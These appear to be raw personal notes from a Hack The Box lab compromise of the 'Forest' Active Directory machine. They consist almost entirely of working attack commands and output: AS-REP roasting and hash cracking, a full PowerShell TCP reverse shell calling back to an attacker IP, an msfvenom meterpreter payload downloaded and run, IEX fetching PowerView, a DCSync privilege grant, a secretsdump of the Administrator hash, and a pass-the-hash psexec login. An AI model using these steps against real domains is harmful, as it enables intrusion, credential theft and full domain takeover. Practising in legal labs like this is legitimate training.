Users enumeration :

sudo ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '{}' | cut -d ' ' -f 2 | sort | uniq | cut -d ',' -f 1 > ~/Desktop/HackingLab/HackTheBox/Machines/Forest/Reports/new_users.txt 


impacket-GetNPUsers -usersfile ~/Desktop/HackingLab/HackTheBox/Machines/Forest/Reports/new_users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.10.161 'htb.local/


We get user svc-alfresco hash .

$krb5asrep$23$svc-alfresco@HTB.LOCAL:deb3ab8a4e514a753b5b62f6d6658e6a$d315daaf ... 

hashcat -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt
	
svc-alfresco:s3rvice

$cme winrm  10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -x 'wget http://10.10.14.32:8080'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
HTTP        10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
HTTP        10.10.10.161    5985   FOREST           [+] Executed command


------------------


┌─[parrot@parrot]─[~/Tools/CrackMapExec]
└──╼ $cme winrm  10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -X '$LHOST = "10.10.14.32"; $LPORT = 1234; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
HTTP        10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)


------ bad revshell lets do a meterpreter

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=4444 -f exe -o reverse.exe

msfconsole

set payload windows/x64/meterpreter/reverse_tcp
set lhost 
set lport
exploit

Invoke-WebRequest -Uri http://10.10.14.32:8080/reverse.exe -UseBasicParsing -o reverse.exe

./reverse.exe


IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.32:8080/PowerView.ps1')) 

net group "Exchange Windows Permissions" /add svc-alfresco
$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $pass)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync





─╼ $./secretsdump.py htb.local/svc-alfresco:whitenight123@10.10.10.161
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::


┌─[parrot@parrot]─[~/Tools/CrackMapExec]
└──╼ $cme smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)


./psexec.py Administrator@10.10.10.161 -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6
						## NEED LM hash too , it can be blank LM HASH 
C:\Users\Administrator\Desktop> type root.txt




